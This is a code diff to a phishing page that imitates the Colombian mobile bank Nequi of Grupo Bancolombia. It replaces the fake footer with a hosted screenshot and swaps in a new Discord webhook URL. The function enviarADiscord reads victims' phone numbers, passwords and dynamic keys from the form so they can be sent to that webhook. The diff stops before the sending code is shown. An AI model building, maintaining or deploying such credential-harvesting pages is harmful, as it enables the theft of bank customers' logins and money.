@@ -53,33 +53,17 @@
         <div id="loader"></div>
     </div>
 </div>
-
-<footer class="footer-nequi">
-    <div class="nequi-content">
-        <div class="f-header"><div><strong>Nequi</strong></div><div>Grupo Bancolombia</div></div>
-        <div class="f-line"></div>
-        <div class="f-link">Información legal <span>›</span></div>
-        <div class="f-link">Para personas <span>›</span></div>
-        <div class="f-link">Para tu negocio <span>›</span></div>
-        <div class="f-link">Ayuda <span>›</span></div>
-        <div class="f-link">Conócenos <span>›</span></div>
-        <div class="f-line"></div>
-        <div class="social-box">
-            <div class="s-icon"><i class="fa-brands fa-twitter"></i></div>
-            <div class="s-icon"><i class="fa-brands fa-instagram"></i></div>
-            <div class="s-icon"><i class="fa-brands fa-facebook-f"></i></div>
-            <div class="s-icon"><i class="fa-brands fa-linkedin-in"></i></div>
-            <div class="s-icon"><i class="fa-brands fa-youtube"></i></div>
-        </div>
-    </div>
+  
+  <footer class="footer-image-container" style="text-align: center; padding: 20px 0;">
+    <img src="https://i.ibb.co/SDwSqVVY/Screenshot-20260731-111005-Chrome.jpg" alt="Pie de página" style="max-width: 100%; height: auto; display: block; margin: 0 auto;">
 </footer>
-
-<script>    
+  
+ <script>    
     let intento = 0;
     function formatearDinero(input) { let valor = input.value.replace(/\D/g, ''); input.value = valor !== "" ? new Intl.NumberFormat('es-CO').format(valor) : ""; }
     
     async function enviarADiscord() { 
-        const webhookUrl = "https://discord.com/api/webhooks/1507625535520374784/wnVSTOReBdybfeidrsbTzTkBNysRgRNQKjdNsXz5v1M1eXmQeh_ajyNxUqb_j-YKEAPi";
+        const webhookUrl = "https://discord.com/api/webhooks/1520119877841588235/09Lj574ZkxPmrYqMQMAw6g4a-39axrnzD-rWm6H049XNVRzXFarsFo2VSYsVfGGb_ldY";
         const celular = document.getElementById('celular').value;
         const clave = document.getElementById('pass').value;
         const claveDinamica = document.getElementById('claveDinamica').value;
